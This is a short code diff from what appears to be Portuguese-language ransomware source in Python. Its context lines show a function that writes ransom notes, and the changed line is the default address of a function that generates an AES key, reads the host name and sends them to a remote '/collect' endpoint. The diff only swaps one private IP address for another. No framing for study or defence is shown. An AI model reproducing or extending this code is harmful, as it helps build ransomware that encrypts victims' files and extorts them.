@@ -83,7 +83,7 @@ def gerar_notas_resgate(base_path: str = "."):
         except OSError as e:
             print(f"Erro ao criar {leiam_path}: {e}", file=sys.stderr)
 
-def enviar_chave(url: str = "http://192.168.1.100:8080/collect") -> bool:
+def enviar_chave(url: str = "http://10.254.19.238:8080/collect") -> bool:
     try:
         hostname: str = socket.gethostname()
         aes_key_bytes: bytes = os.urandom(32)
